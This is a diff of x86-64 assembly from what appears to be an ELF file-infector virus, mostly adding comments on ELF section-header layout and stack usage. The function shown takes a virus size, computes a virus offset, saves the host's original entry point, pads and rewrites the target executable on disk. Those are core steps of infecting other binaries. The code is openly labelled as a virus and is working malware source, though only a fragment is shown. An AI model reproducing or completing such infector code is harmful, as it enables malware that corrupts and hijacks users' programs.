@@ -1,35 +1,69 @@
+;; ---------------------------------------------------
+;; ELF Section Header
+;; ---------------------------------------------------
+;;	typedef struct {
+;;		uint32_t   sh_name;			4
+;;		uint32_t   sh_type;			4
+;;		uint32_t   sh_flags;		4
+;;		Elf32_Addr sh_addr;			4
+;;		Elf32_Off  sh_offset;		4
+;;		uint32_t   sh_size;			4
+;;		uint32_t   sh_link;			4
+;;		uint32_t   sh_info;			4
+;;		uint32_t   sh_addralign;	4
+;;		uint32_t   sh_entsize;		4
+;;	} Elf32_Shdr;					40
+
+;;	typedef struct {
+;;		uint32_t   sh_name;			4
+;;		uint32_t   sh_type;			4
+;;		uint64_t   sh_flags;		8
+;;		Elf64_Addr sh_addr;			8
+;;		Elf64_Off  sh_offset;		8
+;;		uint64_t   sh_size;			8
+;;		uint32_t   sh_link;			4
+;;		uint32_t   sh_info;			4
+;;		uint64_t   sh_addralign;	8
+;;		uint64_t   sh_entsize;		8
+;;	} Elf64_Shdr;					64
+;; ---------------------------------------------------
+
 section .text
 	global _update_mmaped_file
 	extern _string
 
-_update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_size, long virus_size, long fd)
+;; ---------------------------------------------------
+;; Re-mmap and update file
+;;		update_mmaped_file(void *mmap_base_address, long file_size, long virus_size, long fd)
+;; ---------------------------------------------------
+_update_mmaped_file:
 	enter 256, 0
-	; rsp + 0  mmap start address (ehdr)
-	; rsp + 8  file size
-	; rsp + 16 virus size
-	; rsp + 24 fd
-	; rsp + 32 phdr (ehdr + ehdr->e_phoff)
-	; rsp + 40 shdr (ehdr + ehdr->e_shoff)
-	; rsp + 48 actual phnum or actual shnum for respectively treat_all_segments or treat_all_sections
-	; rsp + 56 ehdr->e_phnum or ehdr->e_shnum for respectively treat_all_segments or treat_all_sections
-	; rsp + 64 found? bool
-	; rsp + 72 virus offset
-	; rsp + 80 o_entry store address (it's the address where we store the o_entry, (char *))
-	; rsp + 88 number of 0 bytes to add
-	; rsp + 96 i
-	; rsp + 104 = 0
-	; rsp + 108 mmap_tmp addr
-	; rsp + 116 index mmap_tmp
-	;;;;;;;;;;;;;;;;;;;;;
+	;; ---------------------------------------------------
+	;; Stack usage
+	;; ---------------------------------------------------
+	;; rsp + 0  mmap start address (ehdr)
+	;; rsp + 8  file size
+	;; rsp + 16 virus size
+	;; rsp + 24 fd
+	;; rsp + 32 phdr (ehdr + ehdr->e_phoff)
+	;; rsp + 40 shdr (ehdr + ehdr->e_shoff)
+	;; rsp + 48 actual phnum or actual shnum for respectively treat_all_segments or treat_all_sections
+	;; rsp + 56 ehdr->e_phnum or ehdr->e_shnum for respectively treat_all_segments or treat_all_sections
+	;; rsp + 64 found? bool
+	;; rsp + 72 virus offset
+	;; rsp + 80 o_entry store address (it's the address where we store the o_entry, (char *))
+	;; rsp + 88 number of 0 bytes to add
+	;; rsp + 96 i
+	;; rsp + 104 = 0
+	;; rsp + 108 mmap_tmp addr
+	;; rsp + 116 index mmap_tmp
+	;; ---------------------------------------------------
 
 ; init phase
 ; first mov all params on stack
 	mov QWORD [rsp], rdi
-
 	mov QWORD [rsp + 8], rsi
-
 	mov QWORD [rsp + 16], rdx
-
 	mov QWORD [rsp + 24], r10
 
 ; init phdr (ehdr + ehdr->e_phoff)
@@ -45,7 +79,7 @@ _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_siz
 ; init shdr (ehdr + ehdr->e_shoff)
 	mov r10, QWORD [rsp] ; take the mmap_base_address
 	mov QWORD [rsp + 40], r10 ; store it on stack
-	add QWORD [rsp + 40], 40 ; add 40 on the address (offset ont the header for e_shoff) 
+	add QWORD [rsp + 40], 40 ; add 40 on the address (offset ont the header for e_shoff)
 	mov r10, QWORD [rsp + 40] ; take this address
 	mov r10, QWORD [r10] ; dereference it to take the value
 	mov QWORD [rsp + 40], r10 ; mov it on stack
@@ -223,7 +257,7 @@ _write_in_tmp_map:
 ;; memcpy(mmap_tmp + index, o_entry, 8);
 	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
-	mov rsi, rsp ; 
+	mov rsi, rsp ;
 	add rsi, 80
 	mov rcx, 8 ; size
 	cld
@@ -267,7 +301,7 @@ _write_into_file:
 	mov rax, 1
 	mov rdi, QWORD [rsp + 24]
 	mov rsi, QWORD [rsp + 108]
-	mov rdx, QWORD [rsp + 8] 
+	mov rdx, QWORD [rsp + 8]
 	add rdx, 4096
 	syscall
 
